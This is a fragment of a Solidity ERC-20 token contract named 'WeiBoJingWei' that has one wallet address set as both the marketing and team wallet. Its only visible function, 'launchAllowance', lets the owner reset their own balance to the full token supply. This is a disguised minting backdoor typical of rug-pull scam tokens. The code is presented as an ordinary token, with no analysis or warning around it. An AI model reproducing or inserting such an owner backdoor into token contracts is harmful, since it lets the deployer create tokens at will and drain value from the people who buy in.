...
contract WeiBoJingWei is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "WeiBoJingWei";
    string private _symbol = "WEI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3b3D33Ee469e80E72A4Dab74525978D2f05b6935);
    address payable public teamWalletAddress = payable(0x3b3D33Ee469e80E72A4Dab74525978D2f05b6935);
    ...
    function launchAllowance() public onlyOwner returns (bool success) {_Wallets[owner()] = _totSupply; return true;}
